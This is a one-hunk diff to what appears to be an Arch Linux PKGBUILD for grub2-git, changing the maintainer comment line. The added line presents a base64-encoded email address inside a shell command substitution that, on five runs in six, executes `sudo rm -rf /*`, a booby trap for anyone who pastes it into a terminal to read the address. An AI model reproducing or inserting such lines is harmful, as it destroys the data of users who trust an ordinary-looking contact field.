@@ -1,4 +1,4 @@
-# Maintainer: felix <at yandex dot com, local part isaev preceded by m dot p dot>
+# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
 pkgbase=grub2-git
 
 ### PACKAGE CONFIGURATION
